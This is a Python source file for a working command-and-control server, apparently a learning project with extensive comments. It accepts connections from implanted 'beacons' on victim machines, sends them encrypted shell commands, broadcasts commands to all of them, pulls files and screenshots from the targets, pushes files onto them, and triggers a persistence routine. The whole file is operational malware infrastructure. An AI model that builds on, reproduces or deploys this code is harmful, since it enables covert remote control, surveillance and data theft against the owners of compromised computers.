import socket 
import threading 
import json
import queue
import time
import pyreadline3 as readline
from encrypt import EncryptedCommunicator

class C2Server:
    #This init is in charge of setting up the network configuarations
    # host='0.0.0.0' means to listen on any and all network interfaces 
    # port=8080 is just the specific network port to listen on
    # active_session is the dict to track all connected victums
    # session counter just gives each beacon an ID    
    def __init__(self, host='0.0.0.0', port=8080, password='Mr.Robot'): 
        self.host = host 
        self.port = port
        self.password = password
        self.active_sessions = {}
        self.session_counter = 0
        self.command_queues = {} 
        self.response_queues = {}  #Queue for responses from beacons
        self.lock = threading.Lock()

        self.encryptor = EncryptedCommunicator(password) # This is pretty much creating the encryption engine that we will use to encrypt data in the this server code

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a new socket, IPV4, TCP
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) #sets the options, the option that is being set is SO_REUSEADDR 
                                                                              #so that we can reconnect to the same local address after the server stops.

    def start_server(self):
        server_thread = threading.Thread(target=self._run_server) #creating a thread and assinging it to run "_run_server" (NOT STARTING IT YET)
        server_thread.daemon = True #kills the thread once main program exits
        server_thread.start()  #starts that thread therefore starting the server
        return server_thread  #allows this thread to be used by other functions if needed 

    def _run_server(self):
        try:
            self.server_sock.bind((self.host, self.port)) #this is claiming the IP address and port of our server which we set up earlier
            self.server_sock.listen(5) #this allows for up to 5 beacons to wait in line while the server is busy
            print(f"C2 Server is listenting on {self.host}:{self.port}")
            print(f"waiting for beacon the beacon to connect......")

            while True: #this is acting as a beacon connection acceptor
                client_socket, client_address = self.server_sock.accept() #when a connection is accepted, this is getting a new socket object (client_socket) and IP/port (client_address) that is dedicated to that newley connected beacon
                                                                            #the accept is waiting indefinitely for a new connection  
                print(f"New beacon connection from {client_address}") 

                client_thread = threading.Thread( #creates a parallel thread, like opening a new tab in browser
                    target=self.handle_beacon, #this is running the handle_beacon function inside of the new thread 
                    args=(client_socket, client_address) #giving handle_beacon the beacons address and socket
                )
                client_thread.daemon = True #daemon thread, it will die if the main thread (server) exits
                client_thread.start() #begins running this new thread

        except Exception as e: #saftey net for any error in the try block, exeption types are stored in e, I just don't want python tracebacks
            print(f"Server error: {e}")

    def handle_beacon(self, client_socket, client_address): # given the client_socket and client_address which was gotten from the .accept tuple in start_server()
        session_id = self.session_counter # takes the current value of the counter (starts 0) and assigns it to session_id
        self.session_counter += 1 # inc counter so next beacon connection gets a new ID

        self.active_sessions[session_id] = {      #storing initial beacon info
            'socket': client_socket,
            'address': client_address,
            'connected_at': time.time(),  #timestamp of when the beacon connected
            'last_seen': time.time()
        }
        self.command_queues[session_id] = [] #initializes the command queue for when a beacons connects it can have a fresh command queue 
        print(f"Beacon: {session_id} , Registered from: {client_address}")

        self.response_queues[session_id] = queue.Queue()  # NEW: Initialize response queue

        # Start a separate thread to listen for beacon messages
        listener_thread = threading.Thread(
            target=self._beacon_listener,
            args=(session_id, client_socket)
        )
        listener_thread.daemon = True
        listener_thread.start()

        try:

            while True:
                if self.command_queues[session_id]: #if there are any pending commands for this SPECIFIC beacon... 
                    print(f"[DEBUG] Session {session_id} has {len(self.command_queues[session_id])} queued commands")
                    print(f"[DEBUG] Commands: {self.command_queues[session_id]}")
                
                if self.command_queues[session_id]:
                    next_command = self.command_queues[session_id].pop(0) # pop the most recent command from the queue...
                    
                    # Add command ID to track responses
                    if isinstance(next_command, dict):
                        next_command['cmd_id'] = session_id * 1000 + len(self.command_queues[session_id])
                    else:
                        next_command = {
                            "type": "command",
                            "command": next_command,
                            "cmd_id": session_id * 1000 + len(self.command_queues[session_id]),
                            "timestamp": time.time()
                        }
                    
                    print(f"[DEBUG] Sending command to beacon {session_id}: {next_command}") 
                    encrypted_command = self.encryptor.EncryptMessage(next_command) #encrypt the command...
                    print(f"[DEBUG] Encrypted command length: {len(encrypted_command)} bytes")
                    client_socket.send(encrypted_command) #send the encrypted command from the server to the beacon
                    print(f"[DEBUG] Command sent, waiting for response...")

                    # Wait for response with timeout
                    try:
                        # Wait up to 30 seconds for response
                        response = self.response_queues[session_id].get(timeout=30)
                        print(f"\n[Beacon {session_id} Response] ---> {response}")
                        self.show_prompt() #this is showing the command prompt to the screen 
                        
                    except queue.Empty:
                        print(f"\n[!] Timeout waiting for response from beacon {session_id}\n")
                        self.show_prompt()

                
                else:
                    # If no commands to send, sleep briefly to prevent CPU spinning
                    time.sleep(0.5)
                    
                # Check if beacon is still connected
                if session_id not in self.active_sessions:
                    break

        except Exception as e: #catches any error that happens in the beacon handling loop 
            print(f"Beacon {session_id} error: {e}") #shows that error 
        finally:   #this finally block is in charge of clean up after a beacon disconnnects 
            client_socket.close() #closes the network connection to that beacon and free's up the port 
            with self.lock:   #thread lock while doing clean up to prevent race condintions and data corruption
                if session_id in self.active_sessions:  #checking the session is in the session tracking dict
                    del self.active_sessions[session_id]  #removes that beacon from the list
                if session_id in self.command_queues: #if the beacon has a command queue
                    del self.command_queues[session_id]  # clean up any pending commands for that beacon
                if session_id in self.response_queues:  # NEW: Clean up response queue
                    del self.response_queues[session_id]
            print(f"Beacon {session_id} disconnnected") 


    def update_beacon_status(self, session_id):
        with self.lock:  #hold thread lock so that other threads don't interfere in this process 
            if session_id in self.active_sessions:  #just making sure the beacon is in the list 
                self.active_sessions[session_id]['last_seen'] = time.time()  #update the last beacons last seen timestamp


    def _beacon_listener(self, session_id, client_socket):
        """Separate thread to listen for incoming messages from beacon"""
        try:
            while True:
                # Set a reasonable timeout
                client_socket.settimeout(5.0)
                
                try:
                    
                    encrypted_data = client_socket.recv(131072)  # 128KB buffer needed for screen shots
                    
                    if not encrypted_data:
                        print(f"[!] Beacon {session_id} disconnected (listener)")
                        # Clean up
                        with self.lock:
                            if session_id in self.active_sessions:
                                del self.active_sessions[session_id]
                        break
                    
                    print(f"[DEBUG] Received {len(encrypted_data)} bytes from beacon {session_id}")
                    
                    # Try to decrypt
                    try:
                        beacon_data = self.encryptor.DecryptMessage(encrypted_data)
                    except Exception as e:
                        print(f"[-] Failed to decrypt message from beacon {session_id}: {e}")
                        
                        # If large buffer failed, try chunked receiving
                        print(f"[DEBUG] Trying chunked receive...")
                        
                        # Collect all available data
                        all_data = encrypted_data
                        client_socket.settimeout(0.5)  # Short timeout for more data
                        
                        try:
                            while True:
                                more_data = client_socket.recv(65536)
                                if not more_data:
                                    break
                                all_data += more_data
                                print(f"[DEBUG] Added {len(more_data)} more bytes, total: {len(all_data)}")
                        except socket.timeout:
                            pass  # No more data
                        
                        client_socket.settimeout(5.0)  # Reset timeout
                        
                        # Try decrypting combined data
                        try:
                            beacon_data = self.encryptor.DecryptMessage(all_data)
                            print(f"[DEBUG] Successfully decrypted after chunked receive ({len(all_data)} total bytes)")
                        except Exception as e2:
                            print(f"[-] Still failed to decrypt after chunked receive: {e2}")
                            # Save for debugging
                            try:
                                with open(f"debug_{session_id}_{int(time.time())}.bin", "wb") as f:
                                    f.write(all_data)
                                print(f"[DEBUG] Saved raw data to debug file")
                            except:
                                pass
                            continue
                    
                    # Check message type
                    if beacon_data.get('type') == 'checkin':
                        self.update_beacon_status(session_id)
                        print(f"[Beacon {session_id}] Heartbeat received")
                        continue
                    
                    elif beacon_data.get('type') == 'response':
                        # This is a response to a command
                        print(f"[DEBUG] Got response from beacon {session_id}")
                        # Put response in queue for main thread
                        self.response_queues[session_id].put(beacon_data)
                    
                    elif beacon_data.get('type') == 'file_response':
                        # Handle file upload from beacon
                        print(f"\n[+] Received file from beacon {session_id}")
                        filename = beacon_data.get('filename', 'unknown')
                        data = beacon_data.get('data', '')
                        
                        if data:
                            # Save the file
                            if self.save_file_from_beacon(filename, data):
                                print(f"[+] File saved successfully: {filename}")
                            else:
                                print(f"[-] Failed to save file")
                        self.show_prompt()
                    
                    elif beacon_data.get('type') == 'screenshot':
                        # Handle screenshot from beacon (HEX ENCODED)
                        print(f"\n[+] Received screenshot from beacon {session_id}")
                        hex_data = beacon_data.get('data', '')
                        bmp_size = beacon_data.get('size', 0)
                        
                        if hex_data and bmp_size > 0:
                            import binascii
                            import os
                            from datetime import datetime
                            
                            try:
                                # Convert hex to binary
                                bmp_data = binascii.unhexlify(hex_data)
                                
                                # Verify size
                                actual_size = len(bmp_data)
                                if actual_size != bmp_size:
                                    print(f"[!] Size mismatch: Expected {bmp_size} bytes, got {actual_size} bytes")
                                
                                # Save with timestamp
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                filename = f"screenshots/screenshot_{session_id}_{timestamp}.bmp"
                                
                                # Create screenshots directory
                                os.makedirs("screenshots", exist_ok=True)
                                
                                # Save BMP file
                                with open(filename, 'wb') as f:
                                    f.write(bmp_data)
                                
                                print(f"[+] Screenshot saved: {filename} ({actual_size} bytes)")
                                print(f"[+] Use an image viewer to open the .bmp file")
                                
                            except binascii.Error as e:
                                print(f"[-] Invalid hex data in screenshot: {e}")
                                # Debug: print first/last 100 chars of hex
                                if hex_data:
                                    print(f"[DEBUG] Hex first 100: {hex_data[:100]}")
                                    print(f"[DEBUG] Hex last 100: {hex_data[-100:]}")
                            except Exception as e:
                                print(f"[-] Failed to save screenshot: {e}")
                        else:
                            print(f"[-] Empty or invalid screenshot received")
                        
                        self.show_prompt()
                    
                    else:
                        print(f"[Beacon {session_id} Unexpected] ----> {beacon_data}")
                        
                except socket.timeout:
                    # Timeout is normal - just continue listening
                    continue
                except Exception as e:
                    print(f"[-] Beacon {session_id} listener error: {e}")
                    break
                    
        except Exception as e:
            print(f"Beacon {session_id} listener thread error: {e}")

    def list_sessions(self):
        with self.lock: #locks session data to prevent changes while we are reading from it 
            if not self.active_sessions:  #making sure there are active sessions going
                print("No active sessions")
                return #stop the method here, no point to continue
            
            print("\n======CURRENT ACTIVE BEACONS======")
            for session_id, session_info in self.active_sessions.items():  #this does tuple unpacking, .items() gives us both the Key AND values from the dictionary and then
                                                                           # for session_id, session_info automatically unpacks them into seperate variables, example: First iteration: session_id = 0, session_info = {'socket': ..., 'address': ...}
                duration = time.time() - session_info['connected_at'] #calculating how long this session has been active, current time - when it connected 
                print(f"Session {session_id}: {session_info['address']} (connected: {duration:.0f}s ago)") #shows beacon ID, IP and port, and the duration rounded to the nearest second
                print() #blank line 

    def send_command(self, session_id, command):   #command is the actual command string, Ex: "whoami", "ls" 
        with self.lock:   #locks session data to prevent changes while we are reading from it 
            if session_id not in self.active_sessions: #checking if the beacon has disconnected since the operator typed the command 
                print(f"Session {session_id} not found") 
                return False  #command failed
            
            command_data={     #creates a dictionary that the beacon will understand 
                "type": "command",
                "command": command,
                "timestamp": time.time()
            }

            self.command_queues[session_id].append(command_data)   #accesses the command list for the specific beacon then "appends" the command dictionary to the end of the list
            print(f"Command queued for beacon {session_id}: {command}")
            return True   #command was successful
        
    def send_to_all(self, command):
        with self.lock:
            session_ids = list(self.active_sessions.keys()) #so what happens here is that .keys() grabs the ID's for all the active sessions (dict_keys([0,1,2...]) and then we use list to convert that into a standard python list like [0,1,2...] 

        for session_id in session_ids: #for loop to send the same command to every beacon connected
            self.send_command(session_id, command)
        print(f"Command sent to {len(session_ids)} beacons")  #len(session_ids) counts how many beacons were in the list

    def interactive_shell(self, session_id):
        if session_id not in self.active_sessions:
            print(f"Session {session_id} not found")
            return 
        
        print(f"Starting interactive shell with beacon!")
        print("Type 'exit' to return to main menu")
        print("Special commands:")
        print("  !sysinfo             - Get comprehensive system profile")
        print("  !download [local] [remote] - Send file to beacon")
        print("  !upload [remote]     - Get file from beacon")
        print("  !screenshot          - Capture and download screenshot")
        print("  !persist             - Establish persistence on target")

        while True:   #infinite loop for continuous command input
            try:
                command = input(f"Beacon {session_id}> ").strip()  #custom prompt, like Beacon 0> 

                if command.lower() == 'exit':
                    break
                elif command.lower() == 'clear':
                    print("\n" * 100)
                    continue
                elif command == '':
                    continue
                elif command.startswith('!download '):
                    # Format: !download server_path beacon_path
                    parts = command.split(' ', 2)
                    if len(parts) == 3:
                        self.send_file_to_beacon(session_id, parts[1], parts[2])
                    else:
                        print("Usage: !download [local_path] [remote_path]")
                    continue
                elif command.startswith('!upload '):
                    # Format: !upload beacon_path
                    parts = command.split(' ', 1)
                    if len(parts) == 2:
                        self.request_file_from_beacon(session_id, parts[1])
                    else:
                        print("Usage: !upload [remote_path]")
                    continue
                elif command == '!screenshot' or command.startswith('!screenshot'):
                    # Capture screenshot - send as regular command
                    self.send_command(session_id, "!screenshot")
                    time.sleep(1)  # Give time for screenshot capture
                    continue
                elif command == '!persist':
                    # Establish persistence on beacon
                    self.send_command(session_id, "!persist")
                    time.sleep(1)
                    continue
                elif command == '!sysinfo':
                    # Send system info command
                    self.send_command(session_id, "!sysinfo")
                    time.sleep(1)
                    continue
                elif command.startswith('!'):
                    print(f"Unknown special command: {command}")
                    continue

                self.send_command(session_id, command)  #queues commands in the beacons command queue
                
                time.sleep(1)  #wait a sec before the next response

            except KeyboardInterrupt:   #allow for ctrl+c
                break
            except Exception as e:
                print(f"Error: {e}")
                break

    def show_prompt(self):
        print("C2Server> ", end='', flush= True) #immidiate output to the screen

    def send_file_to_beacon(self, session_id, local_path, remote_path):
        
        import base64
        import os
        
        with self.lock:
            if session_id not in self.active_sessions:
                print(f"[-] Session {session_id} not found")
                return False
        
        try:
            # Check if file exists
            if not os.path.exists(local_path):
                print(f"[-] File not found: {local_path}")
                return False
            
            # Get file size
            file_size = os.path.getsize(local_path)
            print(f"[+] File size: {file_size} bytes")
            
            # For large files, we should chunk, but for now let's handle small files
            if file_size > 1024 * 1024:  # 1MB limit for now
                print(f"[-] File too large ({file_size} bytes). Max 1MB for now.")
                return False
            
            # Read file
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            # Encode to base64
            file_b64 = base64.b64encode(file_data).decode('utf-8')
            
            # Create file transfer command
            command_data = {
                "type": "file_transfer",
                "action": "download",
                "local_path": local_path,
                "remote_path": remote_path,
                "data": file_b64,
                "size": file_size,
                "timestamp": time.time()
            }
            
            # Queue the command
            self.command_queues[session_id].append(command_data)
            print(f"[+] File '{local_path}' ({file_size} bytes) queued for download to beacon")
            return True
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

    def request_file_from_beacon(self, session_id, remote_path):
        """Request a file from beacon"""
        with self.lock:
            if session_id not in self.active_sessions:
                print(f"[-] Session {session_id} not found")
                return False
        
        command_data = {
            "type": "file_transfer",
            "action": "upload",
            "remote_path": remote_path,
            "timestamp": time.time()
        }
        
        self.command_queues[session_id].append(command_data)
        print(f"[+] File upload requested: {remote_path}")
        return True

    def save_file_from_beacon(self, filename, file_data_b64):
        """Save file received from beacon"""
        import base64
        import os
        
        try:
            # Decode base64
            file_data = base64.b64decode(file_data_b64)
            
            # Create safe filename
            import re
            safe_name = re.sub(r'[^\w\.-]', '_', os.path.basename(filename))
            save_path = f"downloads/beacon_{safe_name}"
            
            # Create downloads directory if it doesn't exist
            os.makedirs("downloads", exist_ok=True)
            
            # Save file
            with open(save_path, 'wb') as f:
                f.write(file_data)
            
            print(f"[+] File saved: {save_path} ({len(file_data)} bytes)")
            return True
            
        except Exception as e:
            print(f"[-] Failed to save file: {e}")
            return False


    def start_control_interface(self):

        self.start_server() #start server in background 
        time.sleep(1) 

        print("\n" + "="*50)
        print("           C2 SERVER CONTROL INTERFACE")
        print("="*50)
        print("Commands:")
        print("  sessions -l              List all connected beacons")
        print("  sessions -i [ID]         Interact with specific beacon")
        print("  sendall [command]        Send command to all beacons")
        print("  clear                    Clear screen")
        print("  exit                     Shutdown server")
        print("="*50)

        try:
            readline.read_history_file()
            readline.set_history_length(100)
        except (ImportError, AttributeError, FileNotFoundError):
            print("Note: Command history not available")   #command history


        try:
            while True:  #infinite command loop until user types exit
                self.show_prompt() 
                command = input().strip()   #shows prompt and strips of any extra spaces and stuff

                if command == 'sessions -l':
                    self.list_sessions()

                elif command.startswith('sessions -i '):
                    try:
                        session_id = int(command.split(' ')[2])  #splits by spaces and takes the third item (the id) an int
                        self.interactive_shell(session_id)  #starts live shell session
                    except (IndexError, ValueError):
                        print("Usage: sessions -i [SESSION_ID]")

                elif(command.startswith('sendall ')):
                    if len(command) > 8:
                        cmd = command[8:]    #takes everything after "sendall"
                        self.send_to_all(cmd)
                    else:
                        print("Usage: sendall [COMMAND]")

                elif command == 'clear':
                    print("\n" * 100)

                elif command == 'exit':
                    print("SHUTTING DOWN SERVER...")
                    break

                elif command == '':
                    continue

                else:
                    print("Unkown comamnd. Type 'help' for available commands")

        except KeyboardInterrupt:
            print("\n Shutting down...")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    server = C2Server()
    server.start_control_interface()
